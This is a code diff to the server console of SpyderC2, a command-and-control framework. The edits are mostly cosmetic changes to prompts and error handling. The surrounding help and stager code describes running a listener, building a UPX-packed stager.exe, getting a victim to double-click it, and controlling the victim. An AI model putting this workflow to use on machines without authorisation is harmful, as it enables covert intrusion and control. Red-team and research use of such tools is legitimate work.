@@ -12,6 +12,7 @@ import datetime
 import pathlib
 import signal
 import socket
+import traceback
 
 ## Provides command history like bash to input
 import readline
@@ -32,6 +33,7 @@ def display_ascii_art():
 	print(''.join([line for line in f]))
 
 def display_main_help_menu():
+	print()
 	print(' --------------------------------------')
 	print('|          SERVER HELP MENU            |')
 	print(' --------------------------------------')
@@ -90,7 +92,7 @@ To test this framework :
 
 1. First run a listener, by running {colored('http','cyan')}. Check in the logs if the listener is started successfully.
 2. Then you would want to generate a payload/stager , by running {colored('generate','cyan')} command. Enter your {colored('host IP','cyan')} address when server URL is asked as this is where the victim will contact. If you are running on your host machine, stager will be generated automatically , but  {colored('if running on docker, you would get a help text','cyan')} to generate the stager.
-3. Then {colored('copy','cyan')} this stager.exe to the victim Windows machine.
+3. Then {colored('copy','cyan')} this stager.exe to the victim machine.
 4. Double click the stager.exe on the victim. You should see a new victim with an ID in logs.
 5. Check the vicitm list using {colored('victims','cyan')} command.
 6. To interact with victim, run {colored('use <victim_id>','cyan')}
@@ -192,17 +194,17 @@ def generate_stager(server_logger):
 	
 	try:
 		if not docker():
-			server_logger.info_log("Generating stager.. Please wait, this might take some time.")
+			server_logger.info_log("Generating stager.. Please wait, this might take some time...")
 			subprocess.check_output(f'sudo docker run -v "$(pwd):/src/" cdrx/pyinstaller-{os_name} ', cwd=rf"{os.path.join(PATH,'shared','tmp')}",shell=True)
 
 			if pack_exe(server_logger,exe_path,packer_path):
-				server_logger.info_log('\nSucessfully Packed exe','green')
+				server_logger.info_log('Sucessfully Packed exe','green')
 			else:
-				server_logger.info_log("\nCouldn't pack exe",'yellow')
+				server_logger.info_log("Couldn't pack exe",'yellow')
 
 
 
-			print(colored(f"exe dumped to {colored(f'<path_to_SpyderC2>/data/shared/tmp/dist/{os_name}','cyan')}. Copy it to your victim machine, once generated. Do run a HTTP server on attacker by running http command before executing stager.exe.",'green'))
+			print(colored(f"\nexe dumped to {colored(f'<path_to_SpyderC2>/data/shared/tmp/dist/{os_name}','cyan')}. Copy it to your victim machine, once generated. Do run a HTTP server on attacker by running http command before executing stager.exe.",'green'))
 		else:
 			print(colored("\nPlease run the following command: "+ colored('sudo docker run -v \"$(pwd):/src/\" cdrx/pyinstaller-'+os_name + ' && ' + '../../utilities/upx/upx ../tmp/dist/'+os_name+'/stager.exe','cyan')+" in "+colored('<path_to_SpyderC2>/data/shared/tmp','blue')+" directory on the host machine.\n The stager will be generated in "+ colored('<path_to_SpyderC2>/data/shared/tmp/dist/'+os_name,'blue')+".\nCopy it to your victim machine, once generated. Do run a HTTP server on attacker by running http command before executing stager.exe on victim."))
 	except subprocess.CalledProcessError as grepexc:                                                                                                   
@@ -234,13 +236,13 @@ def main(args,db_object,server_logger):
 	print()
 
 	while True:
-		print(colored("Enter server commands",'blue'))
+		print(colored("(SpyderC2:) > ",'red'), end='')
 		cmd = str(input())
 
 		if cmd == 'http':
 
 			while True:
-				print(colored("Enter Listening Port. Default is 8080",'cyan'))
+				print(colored("\nEnter Listening Port. Default is 8080",'cyan'))
 				if docker(): print(colored('Please note , for docker the range of usable port is 8080-8100 due to increased startup times for forwarding. if you need more, adjust in the docker-compose.yml'))
 				port = str(input())
 
@@ -261,9 +263,9 @@ def main(args,db_object,server_logger):
 			ret = obj.start_listener()
 
 			if ret:
-				server_logger.info_log("Started http listener.",'green')
+				server_logger.info_log("\nStarted http listener.",'green')
 			else:
-				server_logger.info_log("Failed to start http listener. Something is running on that port.",'yellow')
+				server_logger.info_log("\nFailed to start http listener. Something is running on that port.",'yellow')
 
 				## Attempts to kill the process running on that port
 				## killing with lsof doesn't work in docker
@@ -321,6 +323,8 @@ def main(args,db_object,server_logger):
 			Listener.kill_all_listeners()
 			db_object.drop_db()
 			break
+		else:
+			print(f"Not supported. Type {colored('help','cyan')} to see commands supported.")
 
 		print()
 
@@ -388,7 +392,7 @@ if __name__=="__main__":
 
 	try:
 		main(args,db_object,server_logger)
-	except Exception as e:
-		server_logger.info_log(e,'red')
+	except:
+		server_logger.info_log(traceback.format_exc(),'red')
 		Listener.kill_all_listeners()
 		db_object.drop_db()
